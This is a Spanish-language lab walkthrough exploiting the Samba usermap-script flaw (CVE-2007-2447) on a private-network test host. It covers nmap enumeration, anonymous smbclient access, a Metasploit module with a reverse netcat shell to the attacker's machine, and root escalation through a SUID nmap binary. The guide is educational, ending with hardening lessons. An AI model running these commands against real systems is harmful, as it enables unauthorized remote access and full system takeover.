# 🎯 Objetivo del laboratorio:

- Explotar la vulnerabilidad en Samba.
- Obtener acceso remoto.
- Escalar privilegios a root.

# 🧱 1. Información técnica.

| Servicio | Samba (smbd) |
| Puerto | 139 / 445 |
| Versión | Samba 3.X - 4.X |
| Vulnerabilidad | CVE-2007-2447 – Usermap Script |
| Nivel | Medio |
| Explotación | Manual o Metasploit |

# 🛠️ 2. Requisitos previos en Kali.

Verificamos si tenemos en nuestro sistema Linux:

```bash
smbclient --version
msfconsole
```

Si no tenemos instalado alguno de ellos:

```bash
sudo apt update
sudo apt install smbclient metasploit-framework -y
```

# 🧪  3. Enumeración inicial (manual).

Lanzamos desde Kali:

```bash
nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery 192.168.56.102
```

Este comando busca:

- Carpetas compartidas (shares).
- Usuarios.
- Información del sistema.

# 🧬 4. Explotación manual paso a paso.

La vulnerabilidad permite ejecutar comandos remotos sin autenticación, aprovechando la opción username map script.

```bash
smbclient -L //192.168.56.102/ -N
```
La consola nos motrará los recursos compartidos.

Intentamos conectarnos a uno:

```bash
smbclient //192.168.56.102/tmp -N
```

En este punto podremos subir y descargar archivos:

```bash
put prueba.txt
````

Con este comando subimos archivos que tengamos en nuestra Kali Linux al sistema que estamos atacando, lo que nos demustra que podemos leer y escribir archivos remotamente sin autenticación.

```bash
get prueba.txt
```

Con este comando obtenemos archivos del sistema que estamos atacando y los almacenamos en nuestro Kali Linux, donde podremos obtener y ver la información.

# ⚡ 5. Explotación automática con Metasploit.

5.1 Iniciamos el framework Metasploit:

```bash
msfconsole
```

5.2 Cargamos el exploit:

```bash
use exploit/multi/samba/usermap_script
```

5.3 Configuramos los parámetros:

```
set RHOSTS 192.168.56.102
set RPORT 139
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 192.168.56.101 (aquí introducimos nuestra IP de Kali, no la que atacamos).
```

5.4 Iniciamos el listener en otra ventana:

Antes de ejecutar el exploit, abrimos una terminal nueva y lanzamos:

```bash
nc -lvnp 4444
```

5.5 Ejecutamos el exploit:

```bash
exploit
```

Una vez realizado todos estos pasos, nos mostrará una reverse shell activa en la terminal del netcat donde tendremos acceso como nobody.

```bash
id
uname -a
```

# 🧗 6. Escalada de privilegios.

Una vez que tenemos la shell como usuario limitado, buscaremos formas de escalar privilegios dentro del sistema con:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Usamos uname -a, id, sudo -l, find / -perm -4000 -type f 2>/dev/null
- Buscamos binarios SUID como nmap, vi, perl, etc.
- Usamos [GTFOBins](https://gtfobins.github.io/) para explotar esos binarios y llegar a root.

Si encontramos:

```bash
/usr/bin/nmap
```

Y observamos que es la versión antigua con una consola interactiva, ejecutamos:

```bash
nmap --interactive
```

Una vez dentro, ejecutamos:

```bash
!sh
```

Y comprobamos:

```bash
id
````

# ✅ Conclusión.

- Samba está mal configurado, permitiendo acceso anónimo.
- La vulnerabilidad CVE-2007-2447 permitió ejecutar comandos sin autenticación.
- Se obtuvo acceso remoto con privilegios root utilizando binarios SUID del sistema.

# 🧠 Lecciones aprendidas.

- Importancia de deshabilitar acceso anónimo en servicios SMB.
- Cómo usar Metasploit para exploits clásicos.
- Práctica real de escalada de privilegios.

